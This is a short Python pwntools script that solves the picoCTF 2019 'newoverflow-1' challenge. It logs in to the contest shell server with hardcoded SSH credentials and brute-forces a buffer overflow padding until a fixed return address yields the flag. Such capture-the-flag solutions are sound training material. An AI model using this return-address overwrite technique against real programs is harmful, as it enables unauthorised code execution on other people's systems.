from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

i = 0
while True:

    program = session.process(['./vuln'], cwd='/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a')

    payload = 'a' * 64 + 'b' * i + '\x68\x07\x40'

    program.sendlineafter("Give me a string that gets you the flag: \n", payload)

    try:
        flagInB = program.recv(timeout=0.5)

        if b'picoCTF' in flagInB:
            flag = flagInB.decode('ascii')
            rawFlag = flag[flag.index('{') + 1:flag.index('}')]

            print(rawFlag)

            break
        else:
            program.close()
    except EOFError:
        program.close()

    i = i + 1



